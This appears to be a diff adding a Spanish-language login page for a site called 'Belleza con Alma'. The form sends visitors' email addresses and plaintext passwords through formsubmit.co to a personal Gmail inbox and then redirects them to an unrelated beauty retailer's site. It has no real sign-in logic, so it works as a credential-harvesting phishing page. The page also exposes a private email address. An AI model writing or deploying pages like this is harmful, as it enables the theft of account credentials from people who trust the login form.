@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión | Belleza con Alma</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .form-container { display: none; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .active-form { display: block; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <a href="index.html" class="back-button">← Volver al inicio</a>
+        
+        <!-- Formulario de Inicio de Sesión -->
+        <div id="login-form-container" class="form-container active-form">
+            <h2>Inicia Sesión</h2>
+            <form id="loginForm" action="https://formsubmit.co/jeicksonaguirregarcia71@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="Nuevo inicio de sesión - Belleza con Alma">
+                <input type="hidden" name="_next" value="https://www.blissim.es"> <!-- Cambiado a blissim.es -->
+                
+                <div class="input-group">
+                    <label for="login-email">Correo electrónico</label>
+                    <input type="email" id="login-email" name="email" placeholder="ejemplo@gmail.com" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="login-password">Contraseña</label>
+                    <input type="password" id="login-password" name="password" placeholder="••••••••" required>
+                </div>
+                
+                <button type="submit" class="btn">Ingresar</button>
+            </form>
+            
+            <div class="links">
+                <a href="#" onclick="showForm('register-form-container')">¿No tienes cuenta? Regístrate</a>
+                <a href="#" onclick="showForm('forgot-password-container')">¿Olvidaste tu contraseña?</a>
+            </div>
+        </div>
+
+        <!-- Resto de tu código (formularios de registro y recuperación) permanece igual -->
+        <!-- ... -->
+    </div>
+
+    <script>
+        // Función original para cambiar formularios
+        function showForm(formId) {
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active-form');
+            });
+            document.getElementById(formId).classList.add('active-form');
+        }
+    </script>
+</body>
+</html>
